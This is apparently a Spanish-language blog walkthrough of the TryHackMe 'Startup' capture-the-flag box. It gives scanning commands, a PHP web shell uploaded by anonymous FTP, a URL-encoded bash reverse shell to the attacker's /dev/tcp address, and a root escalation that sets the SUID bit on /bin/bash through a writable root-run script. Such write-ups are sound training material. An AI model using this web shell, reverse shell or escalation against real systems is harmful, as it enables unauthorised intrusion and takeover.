---
layout: single
title: StartUp - TryHackMe
excerpt: " Startup is a boot2root challenge available on TryHackMe. This is an easy level box which includes compromising a web server by uploading our web shell via FTP and then exploiting a cronjob to get the root shell. "
date: 2022-09-30
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-startup/startup.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - php
  - wireshark
  - ftp
  - suid
  - cronjob
---

Startup is a boot2root challenge available on TryHackMe. This is an easy level box which includes compromising a web server by uploading our web shell via FTP and then exploiting a cronjob to get the root shell.

# # Summary
- IP: 10.10.113.192
- Ports: 21,22,80
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	- 21 -> vsftpd 3.0.3
	- 22 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
	- 80 -> Apache httpd 2.4.18 ((Ubuntu))

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

``` bash
$sudo nmap -p22,80,139,445,8009,8080 -sCV 10.10.116.216 -oN targeted
```

- Entramos a ftp como anonymous y vemos dos archivos y una carpeta; un archivo es una imagen sin relevancia y el otro es una nota la cual contiene un nombre potencial "maya".

- Analizamos la página, no contiene nada relevante; analizamos los directorios:

```bash
$sudo gobuster dir -u 10.10.147.217 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 100
```

- Analizamos el directorio "files" y nos damos cuenta que es el mismo lugar en el que se alojan los archivos subidos por ftp como anonymous, aprovechamos esto para subir un archivo PHP que nos brinde un parámetro "cmd" que nos permita ejecutar un RCE:

nano rev_shell

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

```bash
ftp 10.10.147.217
anonymous
put /home/dante/Tryhackme/startup/content/shell.php /ftp/shell.php
```


- Ahora vamos al directorio "files" de la web, abrimos el archivo envenenado y ejecutamos el comando para entablar una reverse shell:

http://10.10.147.217/files/ftp/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.18.101.123/443%200%3E%261%22

- Hacemos tratamiento de tty; hacemos búsqueda de archivos que nos puedan ayudar a escalar privilegios, encontramos en el directorio raiz la carpeta "incidents" la abrimos y vemos un archivo "pcapng" el cual se puede analizar con wireshark, lo descargamos a nuestra máquina atacante montando un servidor http con python.

- Analizamos el archivo con wireshark, y en uno de los paquetes encontramos la credencial "c4ntg3t3n0ughsp1c3" para la que podría servir con el usuario "lennie":

- Accedemos como "Lennie"  por ssh y encontramos la primera FLAG.


# ESCALANDO PRIVILEGIOS:

- En el directorio de lennie enocntramos una carpeta "scripts" la abrimos, y dentro hay una script en bash, la analizamos:

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

- Si hacemos ls -l podemos ver que este script se ejecuta como root, sin embargo no tenemos permisos para modificarlo, en el script ejecuta también "print.sh", este sí que podemos modificarlo, así que le metemos un comando que otorgue permisos SUID a la bash:

```bash
nano /etc/print.sh
chmod u+s /bin/bash

/bin/bash -p 

#root
```

- Ya somos ROOT y podemos ver la FLAG.
